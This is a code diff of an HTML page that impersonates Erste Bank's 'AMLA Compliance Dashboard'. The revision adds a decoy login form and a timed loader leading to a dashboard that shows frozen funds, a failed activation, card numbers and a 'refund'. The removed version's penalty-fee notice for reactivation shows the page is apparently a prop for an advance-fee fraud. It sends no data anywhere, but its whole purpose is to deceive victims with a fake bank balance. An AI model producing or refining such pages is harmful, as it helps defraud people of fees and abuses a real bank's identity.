@@ -3,167 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERSTE BANK - AMLA Compliance Dashboard</title>
+    <title>ERSTE BANK - AMLA Compliance</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; margin: 0; overflow: hidden;
         }
 
-        /* 7-SECOND LOADING SCREEN */
-        #loader-container {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: white;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            z-index: 9999;
+        /* --- 1. LOGIN SECTION --- */
+        #login-section {
+            background: white; width: 380px; padding: 40px;
+            border-radius: 20px; box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+            text-align: center; display: block; /* Eto ang unang lalabas */
+        }
+        .login-input {
+            width: 100%; padding: 12px; margin: 10px 0;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box;
+        }
+        .login-btn {
+            background: #e11a2b; color: white; border: none; width: 100%;
+            padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold;
+        }
+
+        /* --- 2. LOADING SECTION (HIDDEN AT START) --- */
+        #loader-section {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
         }
         .spinner {
-            width: 50px; height: 50px;
-            border: 5px solid #f3f3f3; border-top: 5px solid #e11a2b;
-            border-radius: 50%; animation: spin 1s linear infinite;
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #e11a2b; border-radius: 50%; animation: spin 1s linear infinite;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* MAIN DASHBOARD */
-        #main-dashboard { display: none; animation: fadeIn 1s ease-in; }
+        /* --- 3. DASHBOARD SECTION (HIDDEN AT START) --- */
+        #dashboard-section {
+            display: none; animation: fadeIn 1s ease-in;
+        }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
         .dashboard-container {
-            background-color: white;
-            width: 460px;
-            border-radius: 30px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.1);
-            text-align: center;
-            overflow: hidden;
-            padding-bottom: 40px;
+            background-color: white; width: 460px; border-radius: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.1); text-align: center; overflow: hidden; padding-bottom: 40px;
         }
-
-        /* TOP RED NOTICE */
         .top-red-notice {
-            background-color: #e11a2b;
-            color: white;
-            padding: 20px;
-            font-weight: bold;
-            font-size: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            animation: pulse 2s infinite;
+            background-color: #e11a2b; color: white; padding: 20px;
+            font-weight: bold; font-size: 15px; text-transform: uppercase; animation: pulse 2s infinite;
         }
-        @keyframes pulse {
-            0% { background-color: #e11a2b; }
-            50% { background-color: #ff4d4d; }
-            100% { background-color: #e11a2b; }
-        }
+        @keyframes pulse { 0%, 100% { background-color: #e11a2b; } 50% { background-color: #ff4d4d; } }
 
         .content-padding { padding: 30px 40px; }
         .bank-logo { color: #e11a2b; font-weight: 900; font-size: 24px; margin-bottom: 5px; }
-        .title { color: #00529b; font-size: 13px; font-weight: 700; margin-bottom: 25px; text-transform: uppercase; }
-
-        /* FUNDS BREAKDOWN SUMMARY */
         .funds-summary {
-            background-color: #fcfcfc;
-            border: 1px solid #eee;
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 20px;
-            text-align: left;
+            background-color: #fcfcfc; border: 1px solid #eee; border-radius: 20px;
+            padding: 25px; margin-bottom: 20px; text-align: left;
         }
         .summary-row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 8px; color: #555; }
         .refund-row { color: #27ae60; font-weight: 800; border-bottom: 1.5px dashed #ddd; padding-bottom: 8px; }
         .new-total-row { font-size: 22px; font-weight: 900; color: #1a1a1a; margin-top: 12px; }
 
-        /* CARDS WITH UPDATED LABELS */
         .card {
             background: linear-gradient(135deg, #d4af37, #f1d592);
-            border-radius: 20px; padding: 25px; color: white;
-            text-align: left; margin-bottom: 15px; filter: grayscale(15%);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border-radius: 20px; padding: 25px; color: white; text-align: left; margin-bottom: 15px; filter: grayscale(15%);
         }
         .card.black { background: linear-gradient(135deg, #2d3436, #000000); filter: grayscale(30%); }
-        .card-label { font-size: 11px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
         .card-number { font-size: 20px; letter-spacing: 2px; margin-top: 25px; font-family: 'Courier New', monospace; }
-
-        .penalty-notice { font-size: 12px; color: #d35400; font-style: italic; margin-top: 15px; }
+        
         .btn-signout {
-            background-color: #4a5a67; color: white; border: none;
-            padding: 16px; border-radius: 12px; cursor: pointer;
-            font-weight: 700; width: 100%; margin-top: 20px;
+            background-color: #4a5a67; color: white; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; margin-top: 20px; font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <!-- 7-SECOND LOADER -->
-    <div id="loader-container">
-        <div class="spinner"></div>
-        <p style="margin-top:20px; font-weight:bold; color:#555;">SECURITY CHECK: ERSTE BANK AMLA VERIFICATION...</p>
+    <!-- 1. LOGIN SECTION -->
+    <div id="login-section">
+        <h2 style="color: #e11a2b;">ERSTE BANK</h2>
+        <p style="font-size: 14px; color: #666;">Login to your AMLA Dashboard</p>
+        <input type="text" class="login-input" placeholder="Username">
+        <input type="password" class="login-input" placeholder="Password">
+        <button class="login-btn" onclick="startLogin()">Login</button>
     </div>
 
-    <!-- MAIN DASHBOARD -->
-    <div id="main-dashboard">
-        <div class="dashboard-container">
-            <div class="top-red-notice">
-                ❌ ACTIVATION FAILED: EXPIRED AT 7:40 AM
-            </div>
+    <!-- 2. LOADING SECTION -->
+    <div id="loader-section">
+        <div class="spinner"></div>
+        <p style="margin-top:20px; font-weight:bold; color:#555;">SECURELY ACCESSING ACCOUNT...</p>
+    </div>
 
+    <!-- 3. DASHBOARD SECTION -->
+    <div id="dashboard-section">
+        <div class="dashboard-container">
+            <div class="top-red-notice">❌ ACTIVATION FAILED: EXPIRED AT 7:40 AM</div>
             <div class="content-padding">
                 <div class="bank-logo">S ERSTE BANK</div>
-                <div class="title">AMLA Compliance Dashboard</div>
+                <div class="title" style="color: #00529b; font-size: 13px; font-weight: 700; margin-bottom: 25px; text-transform: uppercase;">AMLA Compliance Dashboard</div>
 
                 <div class="funds-summary">
-                    <div class="summary-row">
-                        <span>Original Card Balance:</span>
-                        <span>€ 17,250.00</span>
-                    </div>
-                    <div class="summary-row refund-row">
-                        <span>Refund for Documentary:</span>
-                        <span>+ € 1,200.00</span>
-                    </div>
-                    <div class="summary-row new-total-row">
-                        <span>TOTAL FUNDS:</span>
-                        <span>€ 18,450.00</span>
-                    </div>
+                    <div class="summary-row"><span>Original Balance:</span><span>€ 17,250.00</span></div>
+                    <div class="summary-row refund-row"><span>Refund for Documentary:</span><span>+ € 1,200.00</span></div>
+                    <div class="summary-row new-total-row"><span>TOTAL FUNDS:</span><span>€ 18,450.00</span></div>
                 </div>
 
-                <!-- GOLD VISA CARD -->
                 <div class="card">
-                    <span class="card-label">GOLD VISA CARD</span>
+                    <span style="font-size: 11px; font-weight: 900;">GOLD VISA CARD</span>
                     <span style="float: right; font-weight: bold;">€ 17.250,00</span>
                     <div class="card-number">4627 5539 1972 8328</div>
-                    <div style="font-size: 9px; margin-top: 5px; opacity: 0.8;">ERSTE BANK PLATINUM - EXPIRED</div>
                 </div>
 
-                <!-- PLATINUM CREDIT CARD -->
                 <div class="card black">
-                    <span class="card-label">PLATINUM CREDIT CARD</span>
+                    <span style="font-size: 11px; font-weight: 900;">PLATINUM CREDIT CARD</span>
                     <span style="float: right; font-weight: bold;">€ 3.000,00</span>
                     <div class="card-number">5108 2663 1028 8860</div>
-                    <div style="font-size: 9px; margin-top: 5px; opacity: 0.8;">ERSTE BANK PLATINUM - EXPIRED</div>
                 </div>
 
-                <p class="penalty-notice">
-                    Contact <b>AMLA Compliance Dept</b> to fix status. <br>
-                    Note: A penalty fee is required for reactivation.
-                </p>
-
-                <button class="btn-signout">Sign Out</button>
+                <button class="btn-signout" onclick="location.reload()">Sign Out</button>
             </div>
         </div>
     </div>
 
     <script>
-        setTimeout(function() {
-            document.getElementById('loader-container').style.display = 'none';
-            document.getElementById('main-dashboard').style.display = 'block';
-            document.body.style.overflow = 'auto';
-        }, 7000);
+        function startLogin() {
+            // Itago ang Login, Ipakita ang Loader
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('loader-section').style.display = 'flex';
+
+            // Wait 7 seconds
+            setTimeout(function() {
+                // Itago ang Loader, Ipakita ang Dashboard
+                document.getElementById('loader-section').style.display = 'none';
+                document.getElementById('dashboard-section').style.display = 'block';
+                document.body.style.overflow = 'auto';
+            }, 7000);
+        }
     </script>
 
 </body>
